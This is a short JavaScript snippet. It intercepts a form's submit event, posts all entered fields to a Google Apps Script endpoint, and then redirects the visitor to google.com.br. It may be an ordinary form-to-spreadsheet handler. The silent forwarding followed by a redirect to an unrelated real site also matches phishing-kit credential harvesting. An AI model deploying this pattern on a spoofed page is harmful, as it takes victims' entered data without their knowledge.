
            let form = document.querySelector("form");
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                let data = new FormData(form);
                fetch('https://script.google.com/macros/s/AKfycbx4--aBtnPKQho92pclV42Su9PTpg4eql-gB8FhQlCnE6pEWf1WWqIjyRhjfmvEsJ7f/exec', {
                    method: "POST",
                    body: data
                })
                  setTimeout(()=>{ 
                        window.location.href="https://www.google.com.br/ "; 
                       }, 1000); 
            });
    